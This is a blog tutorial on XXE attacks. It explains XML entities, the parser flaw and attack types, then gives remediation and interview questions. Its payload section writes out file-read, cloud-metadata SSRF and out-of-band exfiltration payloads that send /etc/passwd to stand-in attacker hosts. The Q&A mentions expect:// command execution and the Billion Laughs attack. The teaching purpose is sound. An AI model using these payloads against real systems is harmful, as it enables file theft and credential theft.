---
layout: default
title: "XML External Entity (XXE): The Theory & Mechanics (Part 1)"
date: 2025-12-03
categories: [Web Security, Theory, XML]
toc: true
---

# XML External Entity (XXE): Understanding the Mechanics

Before we start stealing `/etc/passwd` files, we must understand the language that makes it possible: XML. XXE is not just about injecting code; it is about exploiting a feature—**External Entities**—that was designed for flexibility but is often enabled by default in insecure configurations.

---

## 🔸 1. What is XML and DTD?

**XML (Extensible Markup Language)** is a markup language designed to store and transport data. Unlike HTML, which displays data, XML carries data.

To validate the structure of an XML document, a **DTD (Document Type Definition)** is used. The DTD defines the legal building blocks of an XML document, like what elements and attributes are allowed.



### The "Entity" (The Variable)
Inside a DTD, we can define **Entities**. Think of an entity like a variable in programming. You define it once, and you can use it multiple times in the document.

*Internal Entity:** The value is defined right there in the DTD.
    `<!ENTITY name "Vishnu">`

*External Entity:** The value is fetched from an external source (a file or URL).
    `<!ENTITY name SYSTEM "file:///etc/passwd">`

---

## 🧨 2. The Vulnerability: Unsafe Parsing

The vulnerability exists when an application parses XML input **without disabling the processing of external entities**.

**Root Cause:**
Many XML parsers (in Java, PHP, .NET) have **External Entities enabled by default**. When the parser sees the `SYSTEM` keyword, it obediently pauses parsing, fetches the content from the specified URI, and substitutes the entity with that content.

### The Core Assumption
Developers often assume:
1.  The XML input is just data structure.
2.  The parser will only look at the structure, not execute instructions.
3.  Users won't define their own DTDs.

**The Reality:** If the parser honors the user-supplied DTD, an attacker can force the server to read local files or make HTTP requests to internal systems.

---

## 🧠 3. How does it work? (The Mechanics)

*If I send `<foo>&xxe;</foo>`, how does the server give me the password file?*

1.  **Injection:** The attacker sends an XML payload containing a `<!DOCTYPE>` declaration. Inside it, they define an entity `xxe` that points to `file:///etc/passwd`.
2.  **Parsing:** The application's XML parser reads the DTD. It sees `SYSTEM` and the file path.
3.  **Retrieval:** The server (not the client!) opens `/etc/passwd` on its local disk and reads the content.
4.  **Substitution:** The parser replaces `&xxe;` with the actual content of the file (e.g., `root:x:0:0...`).
5.  **Response:** The application processes the data (perhaps displaying it in an error message or a profile field), revealing the file to the attacker.

---

## 🧩 4. Types of XXE Attacks

Not all XXE attacks look the same. They vary based on what the server returns to you.

| Attack Type | Description | Goal |
| :--- | :--- | :--- |
| **In-Band (Classic)** | The application returns the entity's value in the response (e.g., in a "Welcome, [User]" message). | Direct File Theft |
| **Blind (Out-of-Band)** | The application processes the XML but **does not** show the output. You must force the server to send data to your own server. | Data Exfiltration |
| **Error-Based** | The application reveals the file content inside a verbose error message (e.g., "File not found: [Content]"). | Info Disclosure |



---

## 📍 5. Hidden Attack Surface: Where is XXE?

It's not just `.xml` endpoints. XXE hides in many formats that are XML-based under the hood.

1.  **SVG Uploads:** Scalable Vector Graphics (SVG) are valid XML documents. If an app allows image uploads, you can upload an SVG containing an XXE payload.
2.  **Office Documents:** `.docx` and `.xlsx` files are actually zipped XML files. You can unzip them, inject XXE into the XML, zip them back up, and upload.
3.  **Content-Type Swapping:** Even if a form sends JSON (`application/json`), the backend might accept XML. Try changing the `Content-Type` header to `text/xml` or `application/xml` and sending XML data.

---

## 🛠️ 6. Attack Mechanics: How we inject

We use specific techniques to bypass limitations and extract data.

### 1️⃣ Basic File Retrieval (Classic)
Defining an entity to read a local file.

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

_Goal:_ The server replaces `&xxe;` with the file content.

### 2️⃣ SSRF via XXE

Forcing the server to make a request to an internal system (like Cloud Metadata).



```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

_Goal:_ Steal AWS credentials or map internal ports.

### 3️⃣ Blind XXE (Out-of-Band)

When you can't see the response, you make the server "phone home" to your Collaborator server.


```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://attacker-server.com](http://attacker-server.com)"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

_Goal:_ Confirm vulnerability via DNS/HTTP interaction.

### 4️⃣ XInclude Attacks

When you cannot modify the `DOCTYPE` (e.g., the input is just a fragment), you can use `XInclude`.



```
<foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

_Goal:_ Inject external content without defining a DTD.

### 5️⃣ Parameter Entities (Bypassing Filters)

If the parser blocks regular entities in the body, we use **Parameter Entities** (`%name;`) inside the DTD itself.



```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '[http://attacker.com/?x=%file](http://attacker.com/?x=%file);'>">
%eval;
%exfil;
```

_Goal:_ OOB exfiltration when basic entities are blocked.

### 6️⃣ The External DTD (Bypassing Parser Restrictions)

Sometimes, parsers block Parameter Entities in the _Internal Subset_. To bypass this, we move the malicious logic to an **External DTD** hosted on our server.

**The Malicious File (`xxe.dtd`):**


```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '[http://attacker.com/?data=%file](http://attacker.com/?data=%file);'>">
%eval;
%exfil;
```

**The Injection Payload:**

```
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "[http://attacker-server.com/xxe.dtd](http://attacker-server.com/xxe.dtd)">
%xxe;
]>
```

_Goal:_ The parser loads the remote DTD and executes the restricted logic "trustingly" from the external file.

---

## 🛡️ 7. Remediation & Defense Strategies

Fixing XXE is straightforward but platform-specific. The general rule is to **disable DTDs**.

### 1️⃣ Disable External Entities (The Golden Rule)

Configure your XML parser to explicitly disallow the processing of external entities and DTDs.

**Java (DocumentBuilderFactory) Example:**

```
factory.setFeature("[http://apache.org/xml/features/disallow-doctype-decl](http://apache.org/xml/features/disallow-doctype-decl)", true);
factory.setFeature("[http://xml.org/sax/features/external-general-entities](http://xml.org/sax/features/external-general-entities)", false);
```

### 2️⃣ Use Simpler Formats

Whenever possible, use complex formats like JSON or YAML which do not support dangerous features like external entity references.

### 3️⃣ Update Parsers

Ensure underlying XML libraries (like `libxml2`) are patched against known vulnerabilities like the "Billion Laughs" DoS attack.

---

## ❓ 8. Interview Corner: Common FAQs (Pentest & AppSec)

If you are interviewing for a security role, XXE is a favorite topic.

### Q1: What is the difference between an Internal and External Entity?

**Answer:** An **Internal Entity** is essentially a variable defined within the DTD (e.g., `<!ENTITY x "value">`). An **External Entity** instructs the parser to fetch content from an external resource using the `SYSTEM` keyword (e.g., `<!ENTITY x SYSTEM "file:///etc/passwd">`). XXE exploits the latter.

### Q2: I found an endpoint that parses XML, but it doesn't show the output. Is it safe?

**Answer:** **No.** It is likely vulnerable to **Blind XXE**. Even if the response is empty, the parser might still be executing the `SYSTEM` command. I would test this using an Out-of-Band (OOB) payload (like Burp Collaborator) to see if the server triggers a DNS or HTTP request to my domain.

### Q3: How can you exploit XXE if the application filters or blocks the ampersand `&` character?

**Answer:** I would try to use **Parameter Entities** (denoted by `%`) inside the DTD. While General Entities (`&name;`) are used in the XML document body, Parameter Entities are used within the DTD definition itself and are often subject to different parsing rules or overlooked by filters.

### Q4: Can XXE lead to Remote Code Execution (RCE)?

**Answer:** **Yes**, but it is rare. It typically requires the PHP `expect://` wrapper to be enabled. If available, I could inject `SYSTEM "expect://id"` to execute system commands. Otherwise, XXE is primarily used for LFI (Local File Inclusion) and SSRF.

### Q5: Why would an attacker need to use an External DTD instead of defining everything in the request?

Answer: Many XML parsers enforce a restriction called "PEs in Internal Subset." This means you cannot use Parameter Entities (entities starting with %) to combine strings or modify other entities inside the main document (Internal DTD).

By hosting the code in an External DTD and referencing it via SYSTEM, the parser treats it as an "External Subset," where these restrictions are relaxed, allowing for data exfiltration.

---

## 🎭 9. Scenario-Based Questions

### 🎭 Scenario 1: The "Secure" Image Upload

Context: You are testing a profile picture upload feature. It only claims to accept PNG and JPEG.

Question: How would you test for XXE here?

Answer: "I would attempt to upload an SVG (Scalable Vector Graphics) file. SVGs are XML-based. Even if the UI says 'PNG only', the backend might process SVGs. I would inject a payload like <!ENTITY xxe SYSTEM "file:///etc/hostname"> inside the SVG code. If the server renders the image, the hostname might appear in the graphic".

---

### 🎭 Scenario 2: The JSON Endpoint

Context: An API endpoint accepts JSON data (Content-Type: application/json).

Question: Is XXE possible?

Answer: "Potentially. I would try Content-Type Swapping. I would change the header to Content-Type: application/xml or text/xml and send valid XML data in the body. If the backend server uses a flexible parser that handles both JSON and XML based on the header, it might process my XML and trigger the XXE".

---

### 🎭 Scenario 3: The "Billion Laughs"

Context: You cannot extract files, but you want to test for Denial of Service vulnerabilities in the XML parser.

Question: What attack would you use?

Answer: "I would use the Billion Laughs Attack (XML Bomb). This involves defining nested entities (e.g., entity A refers to 10 Bs, B refers to 10 Cs) that expand exponentially when parsed, consuming server memory and crashing the service".

---

## 🛑 Summary of Part 1

- **Concept:** XML parsers have a feature (External Entities) to fetch data dynamically.
    
- **Flaw:** Secure defaults are often disabled; parsers trust the user-supplied DTD.
    
- **Attack:** We inject `<!DOCTYPE>` and `SYSTEM` entities to read files (LFI), make network requests (SSRF), or crash the server (DoS).
    
